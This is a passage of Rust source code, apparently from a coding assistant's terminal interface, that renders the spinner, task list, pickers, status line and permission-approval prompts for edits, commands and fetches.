//! Draws the live region pinned under the scrollback: streaming answer,
//! running tools, spinner, then the input box (or a permission prompt) and
//! the mode line.

use std::time::Instant;

use ratatui::layout::Rect;
use ratatui::style::{Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::Paragraph;
use ratatui::Frame;
use unicode_width::UnicodeWidthStr;

use crate::assistant::compaction;
use crate::assistant::todos::{self, Todo, TodoStatus};
use crate::assistant::tools::Access;
use crate::assistant::PermissionRequest;
use crate::code_ui::agent_pages;
use crate::code_ui::items::{self, Item};
use crate::code_ui::shell_item;
use crate::code_ui::state::{
    CapChoice, Picker, PickerRow, PromptView, QueryOption, QueryView, UiState, Waiting,
    INPUT_PLACEHOLDER, SHORTCUTS,
};
use crate::code_ui::status_command::Shown;
use crate::code_ui::{fit, transcript, usage};
use crate::spend::{self, Level};
use crate::subagents::render as subagent_render;
use crate::tui::theme;

const VERBS: [&str; 5] = ["Thinking", "Working", "Reading", "Pondering", "Composing"];
const TIPS: [&str; 4] = [
    "Tip: shift+tab switches to auto, accept-edits or plan (read-only) mode",
    "Tip: ask for a script when you need many files scanned at once",
    "Tip: type a message now; gz reads it before its next step",
    "Tip: esc interrupts; your conversation stays",
];
/// Max rows of a command, script or tool input shown in its approval
/// prompt; a longer one is also printed in full above the prompt.
const MAX_PREVIEW_ROWS: usize = 20;
/// Max rows of a server action's input shown in its approval prompt.
const MAX_ACTION_ROWS: usize = 12;
/// Input lines shown before the box scrolls.
const MAX_INPUT_ROWS: usize = 8;
/// Running subagents listed under the input box before folding the rest
/// into `+N more` (any number may run at once).
const LIVE_SUBAGENT_ROWS: usize = 8;
/// Columns of the spinner line around its label: `⠋ `, `… `.
const SPINNER_FRAME: usize = 4;
/// Label columns the spinner's stats leave free before dropping parts.
const SPINNER_LABEL_MIN: usize = 16;

/// The spinner's rotating verb; while reasoning streams its own line says
/// `Thinking…`, so the spinner says `Working` instead of repeating it.
fn spinner_verb(secs: u64, is_thinking: bool) -> String {
    if is_thinking {
        return "Working".to_string();
    }
    VERBS[(secs / 4) as usize % VERBS.len()].to_string()
}

/// Everything above the input box, as lines.
fn activity_lines(state: &UiState, width: usize) -> Vec<Line<'static>> {
    let mut lines = Vec::new();
    if let Some(thinking) = &state.thinking {
        lines.extend(thinking.item(Instant::now()).render(width));
    }
    if let Some(item) = state.streaming_item() {
        let mut body = item.render(width);
        body.pop();
        lines.extend(body);
        lines.push(Line::from(""));
    }
    for tool in state
        .group
        .iter()
        .chain(&state.running)
        .chain(&state.server_running)
    {
        let mut body = Item::Tool(tool.clone()).render(width);
        body.pop();
        lines.extend(body);
    }
    if state.is_waiting_for_user() {
        lines.push(waiting_for_you_line(state));
    } else if state.busy_since.is_some() {
        let secs = state.working_time(Instant::now()).as_secs();
        // The spinner reads as the task list's current step.
        let doing = state
            .todos
            .iter()
            .find(|t| t.status == TodoStatus::InProgress)
            .map(|t| t.label().to_string());
        let verb = match &state.reconnecting {
            Some(_) => "Reconnecting".to_string(),
            None => doing.unwrap_or_else(|| spinner_verb(secs, state.thinking.is_some())),
        };
        let spark = theme::SPINNER[(state.tick as usize) % theme::SPINNER.len()];
        // The stats keep room for a short label, then the label takes the rest.
        let label_room = verb.width().min(SPINNER_LABEL_MIN) + SPINNER_FRAME;
        let stats = usage::spinner_stats(
            secs,
            &state.usage.turn.tally,
            width.saturating_sub(label_room),
        );
        let verb = items::fit(&verb, width.saturating_sub(stats.width() + SPINNER_FRAME));
        lines.push(Line::from(vec![
            Span::styled(format!("{spark} {verb}… "), theme::brand()),
            Span::styled(stats, theme::muted()),
        ]));
        if let Some(why) = &state.reconnecting {
            lines.push(Line::from(Span::styled(
                format!("  ⎿  {}", items::fit(why, width.saturating_sub(5))),
                theme::muted(),
            )));
        } else if todos::has_open_items(&state.todos) {
            lines.extend(todo_lines(&state.todos, width));
        } else {
            let tip = TIPS[state.turns % TIPS.len()];
            lines.push(Line::from(Span::styled(
                format!("  ⎿  {tip}"),
                theme::muted(),
            )));
        }
    }
    lines.extend(waiting_lines(state, width));
    if state.compacting {
        let spark = theme::SPINNER[(state.tick as usize) % theme::SPINNER.len()];
        lines.push(Line::from(Span::styled(
            format!("{spark} Compacting the conversation…"),
            theme::muted(),
        )));
    }
    if state.account_loading {
        let spark = theme::SPINNER[(state.tick as usize) % theme::SPINNER.len()];
        lines.push(Line::from(Span::styled(
            format!("{spark} Loading your account's usage…"),
            theme::muted(),
        )));
    }
    if let Some(shell) = state.shells.foreground() {
        lines.push(shell_item::running_line(
            &shell.command,
            shell.started.elapsed(),
            state.tick,
            width,
        ));
    }
    if !lines.is_empty() {
        lines.push(Line::from(""));
    }
    lines
}

/// The spinner's place while the turn waits for the user: no animation,
/// and the clock stands still (it shows the time worked so far).
fn waiting_for_you_line(state: &UiState) -> Line<'static> {
    let secs = state.working_time(Instant::now()).as_secs();
    Line::from(vec![
        Span::styled("◇ Waiting for you… ".to_string(), theme::brand()),
        Span::styled(format!("({secs}s worked)"), theme::muted()),
    ])
}

/// Running subagents, listed under the input box.
/// Under the input box: the running subagents, then the tab bar that marks
/// the main page and lists every subagent's page.
fn subagent_lines(state: &UiState, width: usize) -> Vec<Line<'static>> {
    let mut lines = subagent_render::live_group(
        &state.subagents,
        Instant::now(),
        state.tick,
        width,
        LIVE_SUBAGENT_ROWS,
    );
    lines.extend(subagent_render::queued_group(
        &state.queued_targets(),
        width,
    ));
    lines.extend(shell_item::count_line(state.shells.running_count()));
    if !state.pages.is_empty() {
        let hint = agent_pages::SWITCH_HINT;
        let mut bar = agent_pages::tab_bar(
            &state.pages,
            None,
            state.tick,
            width.saturating_sub(hint.len() + 2),
        );
        bar.spans
            .push(Span::styled(format!("  {hint}"), theme::muted()));
        lines.push(bar);
    }
    lines
}

/// A subagent's page, full screen: the tab bar, its title, everything it
/// did (scrollable, searchable), and a key hint.
pub fn draw_agent_page(frame: &mut Frame, state: &mut UiState) {
    let area = frame.area();
    let width = area.width as usize;
    state.transcript_width = width;
    let Some(index) = state.agent_view.as_ref().map(|v| v.index) else {
        return;
    };
    let Some(page) = state.pages.get(index) else {
        state.agent_view = None;
        return;
    };
    let header = vec![
        agent_pages::tab_bar(&state.pages, Some(index), state.tick, width),
        agent_pages::page_title(page, state.tick),
        Line::from(Span::styled("─".repeat(width), theme::muted())),
    ];
    let lines = transcript::lines(&page.items(), width);
    let total = lines.len();
    let Some(view) = state.agent_view.as_mut() else {
        return;
    };
    let viewer = &mut view.viewer;
    viewer.height = area.height.saturating_sub(header.len() as u16 + 1) as usize;
    viewer.clamp(total);
    let query = if viewer.editing {
        String::new()
    } else {
        viewer.query.to_lowercase()
    };
    let visible: Vec<Line<'static>> = lines
        .into_iter()
        .skip(viewer.scroll)
        .take(viewer.height)
        .map(|line| {
            let text: String = line.spans.iter().map(|s| s.content.as_ref()).collect();
            if !query.is_empty() && text.to_lowercase().contains(&query) {
                transcript::highlight(&text, &query)
            } else {
                line
            }
        })
        .collect();
    let top = header.len() as u16;
    frame.render_widget(
        Paragraph::new(header),
        Rect::new(area.x, area.y, area.width, top),
    );
    frame.render_widget(
        Paragraph::new(visible),
        Rect::new(area.x, area.y + top, area.width, viewer.height as u16),
    );
    let footer = if viewer.editing {
        viewer.footer(total)
    } else {
        Line::from(Span::styled(
            " shift+↑↓ switch page · esc back to main · ↑↓ pgup pgdn scroll · / search",
            theme::muted(),
        ))
    };
    frame.render_widget(
        Paragraph::new(footer),
        Rect::new(area.x, area.bottom().saturating_sub(1), area.width, 1),
    );
}

/// The rows the live region needs at `width`, capped at `max`.
pub fn live_height(state: &UiState, width: u16, max: u16) -> u16 {
    let width = width as usize;
    let activity = activity_lines(state, width).len();
    let below = below_height(state, width);
    ((activity + below) as u16).clamp(3, max.max(3))
}

/// The task list under the spinner: done items struck through, the
/// current one bold.
fn todo_lines(todos: &[Todo], width: usize) -> Vec<Line<'static>> {
    let room = width.saturating_sub(10);
    todos
        .iter()
        .enumerate()
        .map(|(i, todo)| {
            let lead = if i == 0 { "  ⎿  " } else { "     " };
            let (mark, style) = match todo.status {
                TodoStatus::Completed => ("☒", theme::muted().add_modifier(Modifier::CROSSED_OUT)),
                TodoStatus::InProgress => ("◼", Style::default().add_modifier(Modifier::BOLD)),
                TodoStatus::Pending => ("☐", Style::default()),
            };
            Line::from(vec![
                Span::styled(lead, theme::muted()),
                Span::styled(format!("{mark} {}", items::fit(&todo.content, room)), style),
            ])
        })
        .collect()
}

/// The model's question or plan as a rounded box, like a permission prompt.
pub fn query_lines(view: &QueryView, width: usize) -> Vec<Line<'static>> {
    let inner = width.saturating_sub(4).max(10);
    let mut body = vec![Line::from(Span::styled(
        view.title(),
        Style::default().add_modifier(Modifier::BOLD),
    ))];
    for line in crate::tui::chat::wrap(&view.text(), inner) {
        body.push(Line::from(line));
    }
    let multi = view.is_multi_select();
    for (i, option) in view.options().iter().enumerate() {
        let chosen = i == view.selected;
        let marker = if chosen { "❯ " } else { "  " };
        let tick = match (multi, option) {
            (true, QueryOption::Pick { .. }) if view.picked.get(i) == Some(&true) => "[x] ",
            (true, QueryOption::Pick { .. }) => "[ ] ",
            _ => "",
        };
        let style = if chosen {
            Style::default()
                .fg(theme::ACCENT)
                .add_modifier(Modifier::BOLD)
        } else {
            Style::default()
        };
        // Options wrap rather than cut: the user is choosing what they say.
        let text = format!("{}. {tick}{}", i + 1, option.label());
        for (row, part) in crate::tui::chat::wrap(&text, inner.saturating_sub(2))
            .into_iter()
            .enumerate()
        {
            let lead = if row == 0 { marker } else { "  " };
            body.push(Line::from(vec![
                Span::styled(lead, Style::default().fg(theme::ACCENT)),
                Span::styled(part, style),
            ]));
        }
        if let QueryOption::Pick {
            description: Some(description),
            ..
        } = option
        {
            const DESCRIPTION_INDENT: &str = "     ";
            let room = inner.saturating_sub(DESCRIPTION_INDENT.len());
            for part in crate::tui::chat::wrap(description, room) {
                body.push(Line::from(Span::styled(
                    format!("{DESCRIPTION_INDENT}{part}"),
                    theme::muted(),
                )));
            }
        }
    }
    let hint = match (&view.typing, multi) {
        (Some(_), _) => "enter send · esc back",
        (None, true) => "space tick · enter confirm · tab skip · esc stop",
        (None, false) => "enter choose · tab skip · esc stop",
    };
    if let Some(text) = &view.typing {
        body.push(Line::from(""));
        body.push(Line::from(vec![
            Span::styled("› ", theme::brand()),
            Span::raw(text.clone()),
            Span::styled("▏", theme::brand()),
        ]));
    }
    body.push(Line::from(Span::styled(hint, theme::muted())));
    boxed(body, inner)
}

/// Rows under the activity: a prompt, the picker, or the input box.
fn below_height(state: &UiState, width: usize) -> usize {
    if let Some(prompt) = &state.prompt {
        return prompt_lines(prompt, width).len();
    }
    if let Some(view) = &state.query {
        return query_lines(view, width).len();
    }
    if let Some(picker) = &state.picker {
        return picker_lines(picker, state, width).len();
    }
    input_rows(state)
        + 2
        + custom_status_lines(state, width).len()
        + subagent_lines(state, width).len()
        + footer_lines(state, width).len()
}

/// Rows of the live region that belong to an open menu, the shortcuts
/// list or a picker: they may cover the transcript's last rows while open.
/// Prompts and questions never do, since they refer to what is above them.
pub fn pop_up_rows(state: &UiState, width: u16) -> u16 {
    if state.prompt.is_some() || state.query.is_some() {
        return 0;
    }
    let width = width as usize;
    let resting = input_rows(state)
        + 2
        + custom_status_lines(state, width).len()
        + subagent_lines(state, width).len()
        + 1;
    below_height(state, width).saturating_sub(resting) as u16
}

/// The model/effort picker as a rounded box.
pub fn picker_lines(picker: &Picker, state: &UiState, width: usize) -> Vec<Line<'static>> {
    picker_lines_within(picker, state, width, usize::MAX)
}

/// The picker in at most `height` rows: when it is taller, its rows
/// scroll so the selected one stays in view between `↑`/`↓ N more` lines,
/// and the title and key hint always show.
pub fn picker_lines_within(
    picker: &Picker,
    state: &UiState,
    width: usize,
    height: usize,
) -> Vec<Line<'static>> {
    let inner = width.saturating_sub(4).max(10);
    let current = state
        .model
        .clone()
        .or_else(|| state.catalog.as_ref()?.default_selection());
    let mut body = vec![
        Line::from(Span::styled(
            items::fit(&picker.title, inner),
            Style::default().add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
    ];
    let mut selected_line = 0;
    for (i, row) in picker.rows.iter().enumerate() {
        let chosen = i == picker.selected;
        if chosen {
            selected_line = body.len();
        }
        let marker = Span::styled(
            if chosen { "❯ " } else { "  " },
            Style::default().fg(theme::ACCENT),
        );
        let style = if chosen {
            Style::default()
                .fg(theme::ACCENT)
                .add_modifier(Modifier::BOLD)
        } else {
            Style::default()
        };
        let (text, is_current) = match row {
            PickerRow::Header(title) => {
                // Wrapped, so notes and previews stay inside the box.
                let pieces = crate::tui::chat::wrap_indented(title, inner.max(8));
                body.extend(
                    pieces
                        .into_iter()
                        .map(|piece| Line::from(Span::styled(piece, theme::muted()))),
                );
                continue;
            }
            PickerRow::Model(model) => (
                model.label(),
                current
                    .as_ref()
                    .is_some_and(|c| c.model.key() == model.key()),
            ),
            PickerRow::Conversation { title, detail, .. } => {
                body.extend(conversation_row_lines(marker, title, detail, style, inner));
                continue;
            }
            PickerRow::Skill {
                name, on, detail, ..
            } => {
                let (mark, mark_style) = if *on {
                    ("[on] ", Style::default().fg(theme::OK))
                } else {
                    ("[off]", theme::muted())
                };
                let mut spans = vec![
                    marker,
                    Span::styled(format!("{mark} "), mark_style),
                    Span::styled(name.clone(), style),
                ];
                if !detail.is_empty() {
                    let room = inner.saturating_sub(12 + name.chars().count());
                    spans.push(Span::styled(
                        format!(" · {}", items::fit(detail, room)),
                        theme::muted(),
                    ));
                }
                body.push(Line::from(spans));
                continue;
            }
            PickerRow::AutoCompact(tokens) => (
                match tokens {
                    Some(tokens) => auto_compact_step_label(state, *tokens),
                    None => "Default (85% of the model's window)".to_string(),
                },
                state.auto_compact == *tokens,
            ),
            PickerRow::Price(offer) => (
                offer.label(),
                state.auto_compact.is_none() && state.price_tier == Some(offer.tier),
            ),
            PickerRow::SubagentModel(mode) => (
                match mode {
                    Some(value) => state
                        .catalog
                        .as_ref()
                        .and_then(|c| c.modes.iter().find(|m| m.value == *value))
                        .map_or_else(|| value.clone(), |m| m.label.clone()),
                    None => "The chat's model".to_string(),
                },
                state.subagent_settings.model == *mode,
            ),
            PickerRow::Cap(choice) => (cap_choice_label(*choice), false),
            PickerRow::Rewind(row) => (row.label(), false),
            PickerRow::Effort(effort) => (
                effort.clone(),
                // Only the current model's own effort counts as current.
                current.as_ref().is_some_and(|c| {
                    Some(c.model.key()) == picker.model.as_ref().map(|m| m.key())
                        && c.effort.as_ref() == Some(effort)
                }),
            ),
        };
        // Rows wrap rather than cut: the words explain the choice. Room
        // is kept on the last row for the current-choice tick.
        let pieces = crate::tui::chat::wrap(&text, inner.saturating_sub(4));
        let last = pieces.len().saturating_sub(1);
        for (row, piece) in pieces.into_iter().enumerate() {
            let lead = if row == 0 {
                marker.clone()
            } else {
                Span::raw("  ")
            };
            let mut spans = vec![lead, Span::styled(piece, style)];
            if is_current && row == last {
                spans.push(Span::styled(" ✔", Style::default().fg(theme::OK)));
            }
            body.push(Line::from(spans));
        }
    }
    body.push(Line::from(""));
    body.push(Line::from(Span::styled(
        "↑↓ move · enter select · esc cancel",
        theme::muted(),
    )));
    let body = scroll_window(body, selected_line, height.saturating_sub(2));
    boxed(body, inner)
}

/// A `/resume` row: the title first, since it names the conversation, and
/// its detail (folder, age, messages) after it when both fit on one row,
/// else on a dim row of its own under the title.
fn conversation_row_lines(
    marker: Span<'static>,
    title: &str,
    detail: &str,
    style: Style,
    inner: usize,
) -> Vec<Line<'static>> {
    const DETAIL_INDENT: &str = "    ";
    let room = inner.saturating_sub(2);
    let one_row = title.width() + 3 + detail.width();
    if detail.is_empty() || one_row <= room {
        let mut spans = vec![marker, Span::styled(items::fit(title, room), style)];
        if !detail.is_empty() {
            spans.push(Span::styled(format!(" · {detail}"), theme::muted()));
        }
        return vec![Line::from(spans)];
    }
    vec![
        Line::from(vec![marker, Span::styled(items::fit(title, room), style)]),
        Line::from(Span::styled(
            format!(
                "{DETAIL_INDENT}{}",
                items::fit(detail, room.saturating_sub(DETAIL_INDENT.len() - 2))
            ),
            theme::muted(),
        )),
    ]
}

/// Lines a picker keeps above its rows (title, blank) and below (blank,
/// key hint) however it scrolls.
const PICKER_TOP: usize = 2;
const PICKER_BOTTOM: usize = 2;

/// `body` cut to `rows` lines, keeping the line at `selected` and the fixed
/// top and bottom lines, with a count of what scrolled out each way.
fn scroll_window(body: Vec<Line<'static>>, selected: usize, rows: usize) -> Vec<Line<'static>> {
    if body.len() <= rows || body.len() < PICKER_TOP + PICKER_BOTTOM {
        return body;
    }
    let middle_end = body.len() - PICKER_BOTTOM;
    let middle_len = middle_end - PICKER_TOP;
    // Two lines say what is above and below the window.
    let window = rows
        .saturating_sub(PICKER_TOP + PICKER_BOTTOM + 2)
        .clamp(1, middle_len);
    let at = selected.saturating_sub(PICKER_TOP).min(middle_len - 1);
    let start = (at + 1).saturating_sub(window).min(middle_len - window);
    let end = start + window;
    let more = |count: usize, arrow: &str| match count {
        0 => Line::from(""),
        n => Line::from(Span::styled(format!("{arrow} {n} more"), theme::muted())),
    };
    let mut lines = body;
    let bottom = lines.split_off(middle_end);
    let rows_below = middle_len - end;
    let shown: Vec<Line<'static>> = lines.drain(PICKER_TOP + start..PICKER_TOP + end).collect();
    lines.truncate(PICKER_TOP);
    lines.push(more(start, "↑"));
    lines.extend(shown);
    lines.push(more(rows_below, "↓"));
    lines.extend(bottom);
    lines
}

/// `300k tokens`, marked when that size takes the current model past its
/// standard price.
fn auto_compact_step_label(state: &UiState, tokens: u64) -> String {
    let size = format!("{} tokens", compaction::label(Some(tokens)));
    match state.price_offers() {
        Some([standard, _]) if tokens > standard.standard_at => {
            format!("{size} · long-context price")
        }
        _ => size,
    }
}

fn cap_choice_label(choice: CapChoice) -> String {
    match choice {
        CapChoice::Raise(kind, to) => {
            format!("Raise the {} cap to {}", kind.word(), spend::usd_limit(to))
        }
        CapChoice::ContinueOnce => "Continue once (this turn and the subagents it starts)".into(),
        CapChoice::Cancel => "Cancel (your message goes back into the input)".into(),
    }
}

/// The mode line's spend: muted while well under every limit, then in the
/// warning and error colors.
fn spend_span(state: &UiState) -> Option<Span<'static>> {
    let text = state.spend.status_text(state.turns)?;
    let style = match state.spend.level() {
        Level::Ok => theme::muted(),
        level => Style::default().fg(theme::spend_level(level)),
    };
    Some(Span::styled(format!("  ·  {text}"), style))
}

fn input_rows(state: &UiState) -> usize {
    state.input.lines().len().clamp(1, MAX_INPUT_ROWS)
}

const COMMAND_MENU_HINT: &str = "↑↓ select · tab complete · enter run · esc dismiss";
const MENTION_MENU_HINT: &str = "↑↓ select · tab/enter insert · esc dismiss";

/// Most rows a popup under the input shows; it scrolls past that.
const MAX_MENU_ROWS: usize = 10;

/// A popup under the input (slash commands, `@` files): up to
/// [`MAX_MENU_ROWS`] matches around the highlighted one, marked like the
/// pickers, then a key hint (with the position when the list scrolls).
fn menu_lines(
    menu: &[(&str, &str)],
    selected: usize,
    hint: &str,
    width: usize,
) -> Vec<Line<'static>> {
    let shown = fit::window(menu.len(), selected, MAX_MENU_ROWS);
    let name_width = menu[shown.clone()]
        .iter()
        .map(|(name, _)| name.width())
        .max()
        .unwrap_or(0)
        + 3;
    let mut lines: Vec<Line<'static>> = menu[shown.clone()]
        .iter()
        .zip(shown.clone())
        .map(|((name, what), i)| {
            let chosen = i == selected;
            let name_style = if chosen {
                Style::default()
                    .fg(theme::ACCENT)
                    .add_modifier(Modifier::BOLD)
            } else {
                Style::default()
            };
            let lead = if chosen { "  ❯ " } else { "    " };
            let pad = name_width.saturating_sub(name.width());
            let named = format!("{lead}{name}{}", " ".repeat(pad));
            let room = width.saturating_sub(named.width());
            if room == 0 {
                let named = fit::truncate(&named, width);
                return Line::from(Span::styled(named, name_style));
            }
            Line::from(vec![
                Span::styled(lead, Style::default().fg(theme::ACCENT)),
                Span::styled(format!("{name}{}", " ".repeat(pad)), name_style),
                Span::styled(fit::truncate(what, room), theme::muted()),
            ])
        })
        .collect();
    let position = if shown.len() < menu.len() {
        format!("{} of {} · ", selected + 1, menu.len())
    } else {
        String::new()
    };
    lines.push(Line::from(Span::styled(
        fit::truncate(&format!("    {position}{hint}"), width),
        theme::muted(),
    )));
    lines
}

fn footer_lines(state: &UiState, width: usize) -> Vec<Line<'static>> {
    if let Some(lines) = crate::code_ui::input_render::footer(state, width) {
        return lines;
    }
    let menu = state.command_menu();
    if !menu.is_empty() {
        let selected = state.menu_selected.min(menu.len() - 1);
        return menu_lines(&menu, selected, COMMAND_MENU_HINT, width);
    }
    let files = state.mention_menu();
    if !files.is_empty() {
        let rows: Vec<(&str, &str)> = files
            .iter()
            .map(|path| {
                (
                    path.as_str(),
                    if path.ends_with('/') { "folder" } else { "" },
                )
            })
            .collect();
        let selected = state.mention_selected.min(rows.len() - 1);
        return menu_lines(&rows, selected, MENTION_MENU_HINT, width);
    }
    if state.show_shortcuts {
        return SHORTCUTS
            .iter()
            .flat_map(|s| crate::tui::chat::wrap(s, width.saturating_sub(4)))
            .map(|row| Line::from(Span::styled(format!("  {row}"), theme::muted())))
            .collect();
    }
    let separator = fit::Segment::new("  ·  ", theme::muted(), 0);
    vec![fit::fit_joined(
        "  ",
        status_segments(state),
        &separator,
        width,
    )]
}

/// Status-line parts, most important first by priority: what answers next
/// and an exit warning stay longest; the shortcuts hint goes first.
fn status_segments(state: &UiState) -> Vec<fit::Segment> {
    use fit::Segment;
    let mut parts = Vec::new();
    if state.exit_armed() {
        parts.push(Segment::new(
            "Press Ctrl+C again to exit",
            Style::default().fg(theme::WARN),
            0,
        ));
    } else if crate::code_ui::input_render::is_shell(state) {
        let hint = crate::code_ui::input_render::shell_hint();
        parts.push(Segment::new(hint.content, hint.style, 1));
    } else if let Some(banner) = state.mode().banner() {
        parts.push(Segment::new(
            banner,
            Style::default().fg(theme::ACCENT_ALT),
            1,
        ));
        parts.push(Segment::glued(" (shift+tab to cycle)", theme::muted(), 8));
    } else {
        parts.push(Segment::new("? for shortcuts", theme::muted(), 9));
    }
    if let Some(model) = state.model_label() {
        // The one place that always says what answers next, so it reads as
        // text, not as a hint.
        parts.push(Segment::new(model, Style::default(), 0));
    }
    if let Some(folder) = state.moved_folder() {
        parts.push(Segment::new(format!("in {folder}"), theme::muted(), 5));
    }
    if let Some((note, warn)) = state.usage.context.as_ref().and_then(usage::context_note) {
        let (style, priority) = if warn {
            (Style::default().fg(theme::WARN), 2)
        } else {
            (theme::muted(), 4)
        };
        parts.push(Segment::new(note, style, priority));
    }
    if let Some(span) = spend_span(state) {
        parts.push(Segment::new(
            span.content.trim_start_matches("  ·  ").to_string(),
            span.style,
            3,
        ));
    }
    let waiting = state.waiting().len();
    if waiting > 0 && state.is_busy() {
        parts.push(Segment::new(
            format!("{waiting} waiting · ctrl+enter sends now"),
            theme::muted(),
            2,
        ));
    } else if waiting > 0 {
        parts.push(Segment::new(format!("{waiting} queued"), theme::muted(), 2));
    }
    parts
}

/// Cuts the empty input's hint to `room` with an ellipsis rather than
/// letting the box crop it.
fn fit_placeholder(state: &mut UiState, room: usize) {
    let hint = fit::truncate(INPUT_PLACEHOLDER, room.saturating_sub(1));
    if state.input.placeholder_text() != hint {
        state.input.set_placeholder_text(hint);
    }
}

/// The custom status line (`/statusline`): the command's first line, or
/// why it failed, dim; cut to fit.
fn custom_status_lines(state: &UiState, width: usize) -> Vec<Line<'static>> {
    let Some(shown) = &state.custom_status else {
        return Vec::new();
    };
    let (text, style) = match shown {
        Shown::Line(text) if text.is_empty() => return Vec::new(),
        Shown::Line(text) => (text, Style::default()),
        Shown::Failed(why) => (why, theme::muted()),
    };
    vec![Line::from(Span::styled(
        fit::truncate(&format!("  {text}"), width),
        style,
    ))]
}

/// Messages typed during the turn that the model hasn't read, in gray,
/// each with where it stands.
fn waiting_lines(state: &UiState, width: usize) -> Vec<Line<'static>> {
    state
        .waiting()
        .into_iter()
        .map(|row| {
            let (text, hint) = match row {
                Waiting::Sent(text) => (text, "sent · gz reads it at its next step"),
                Waiting::Queued(text) => (text, "queued · goes in after the current step"),
                Waiting::AfterTurn(text) if text.starts_with('/') => {
                    (text, "queued · runs after this turn")
                }
                Waiting::AfterTurn(text) => (text, "queued · sends after this turn"),
            };
            let hint = format!("  {hint}");
            let first_line = text.lines().next().unwrap_or_default();
            let room = width.saturating_sub(hint.chars().count() + 2);
            Line::from(vec![
                Span::styled(
                    format!("› {}", items::fit(first_line, room)),
                    theme::muted(),
                ),
                Span::styled(hint, theme::muted()),
            ])
        })
        .collect()
}

/// The permission prompt as a rounded box.
pub fn prompt_lines(prompt: &PromptView, width: usize) -> Vec<Line<'static>> {
    prompt_lines_capped(prompt, width, MAX_PREVIEW_ROWS)
}

/// The prompt box in at most `height` rows when it can be: a preview too
/// tall for the screen gives up rows so the question and every option stay
/// in view. The flag says whether the preview was cut for height, in which
/// case the caller prints it in full above.
fn prompt_lines_within(
    prompt: &PromptView,
    width: usize,
    height: usize,
) -> (Vec<Line<'static>>, bool) {
    let mut lines = prompt_lines(prompt, width);
    if lines.len() <= height {
        return (lines, false);
    }
    let mut cap = preview_row_count(&prompt.request, prompt_inner(width));
    // Each pass drops as many preview rows as the box is over; the cut
    // marker can add one row back, so a second pass may be needed.
    while lines.len() > height && cap > 0 {
        cap = cap.saturating_sub(lines.len() - height);
        lines = prompt_lines_capped(prompt, width, cap);
    }
    // On a very short screen even the bare box is too tall: rows under
    // the title go first, so the question, options and border still show.
    const TITLE_ROWS: usize = 2;
    let excess = lines.len().saturating_sub(height);
    if excess > 0 && lines.len() > TITLE_ROWS + excess {
        lines.drain(TITLE_ROWS..TITLE_ROWS + excess);
    }
    (lines, true)
}

/// Rows of the request's preview the prompt box shows when height allows.
fn preview_row_count(request: &PermissionRequest, inner: usize) -> usize {
    let Some(preview) = request.preview.as_deref() else {
        return 0;
    };
    if let Some((rows, _)) = gutter_preview(request.access, preview, inner) {
        return rows.len().min(MAX_PREVIEW_ROWS);
    }
    if request.access == Access::Write {
        return crate::code_ui::labels::diff_rows(preview)
            .len()
            .min(items::MAX_DIFF_ROWS);
    }
    0
}

/// [`prompt_lines`] showing at most `preview_cap` rows of the preview.
fn prompt_lines_capped(
    prompt: &PromptView,
    width: usize,
    preview_cap: usize,
) -> Vec<Line<'static>> {
    let inner = prompt_inner(width);
    let request = &prompt.request;
    let target = request
        .summary
        .split_once(' ')
        .map(|(_, t)| t.to_string())
        .unwrap_or_else(|| request.summary.clone());
    let creates_file = request
        .preview
        .as_deref()
        .is_some_and(crate::assistant::tools::diff_creates_file);
    let (title, question) = match request.access {
        Access::Write if creates_file => {
            ("Create file", format!("Do you want to create {target}?"))
        }
        Access::Write => (
            "Edit file",
            format!("Do you want to make this edit to {target}?"),
        ),
        Access::Command => (
            "Run command",
            "Do you want to run this command?".to_string(),
        ),
        Access::Script => ("Run script", "Do you want to run this script?".to_string()),
        Access::Read => ("Read files", format!("Allow gz to read {target}?")),
        Access::Folder => (
            "Open folder",
            format!("Allow gz to work in {target}? It is outside the folders open now."),
        ),
        Access::ServerAction => (
            "",
            format!("{}?", request.summary.trim_end_matches(['?', '.'])),
        ),
        Access::Install => ("Install skills", "Install these skills?".to_string()),
        Access::Trust if request.action.as_deref() == Some(crate::code_ui::hooks::TRUST_ACTION) => {
            (
                "Trust project hooks",
                "Run these hook commands in this folder?".to_string(),
            )
        }
        Access::Trust => (
            "Trust team skill",
            "Turn on this version despite its warnings?".to_string(),
        ),
        Access::Fetch => (
            "Fetch page",
            format!("Allow gz to fetch this page from {target}?"),
        ),
        Access::LocalTool => (
            "MCP tool",
            format!("Allow gz to call {target} with these arguments?"),
        ),
    };
    let title = match (request.access, &request.action) {
        (Access::ServerAction, Some(action)) => humanize(action),
        (Access::ServerAction, None) => "Approve action".to_string(),
        _ => title.to_string(),
    };
    let mut heading = vec![Span::styled(
        title,
        Style::default().add_modifier(Modifier::BOLD),
    )];
    if let Some(name) = &request.asked_by {
        heading.push(Span::styled(
            format!("  · asked by subagent {name}"),
            theme::muted(),
        ));
    }
    if request.access == Access::Write
        && request.action.as_deref() == Some(crate::assistant::permissions::FROM_SCRIPT)
    {
        heading.push(Span::styled("  · from a script", theme::muted()));
    }
    let mut body = heading_lines(heading, inner);
    body.push(Line::from(""));
    body.extend(preview_lines(
        request.access,
        request.preview.as_deref(),
        &request.summary,
        inner,
        preview_cap,
    ));
    body.push(Line::from(""));
    // Why gz asks after all (auto mode paused, or its review failed).
    for line in request
        .note
        .as_deref()
        .map(|note| crate::tui::chat::wrap(note, inner))
        .unwrap_or_default()
    {
        body.push(Line::from(Span::styled(
            line,
            Style::default().fg(theme::WARN),
        )));
    }
    body.extend(
        crate::tui::chat::wrap(&question, inner)
            .into_iter()
            .map(Line::from),
    );
    for (i, (_, option)) in prompt.options().iter().enumerate() {
        body.extend(option_lines(i, option, i == prompt.selected, inner));
    }
    if request.always_scope.is_none() && !matches!(request.access, Access::Install | Access::Trust)
    {
        let rows = crate::tui::chat::wrap(
            "always isn't available for destructive actions",
            inner.saturating_sub(5),
        );
        body.extend(
            rows.into_iter()
                .map(|row| Line::from(Span::styled(format!("     {row}"), theme::muted()))),
        );
    }
    if let Some(note) = &prompt.note {
        body.push(Line::from(""));
        body.push(Line::from(vec![
            Span::styled("› ", theme::brand()),
            Span::raw(note.clone()),
            Span::styled("▏", theme::brand()),
            Span::styled("  enter send · esc skip", theme::muted()),
        ]));
    }
    boxed(body, inner)
}

/// The prompt's title and its muted notes (`· asked by subagent …`, `·
/// from a script`) on one row when they fit, else each note on rows of its
/// own under the title.
fn heading_lines(heading: Vec<Span<'static>>, inner: usize) -> Vec<Line<'static>> {
    let line = Line::from(heading);
    if line.width() <= inner {
        return vec![line];
    }
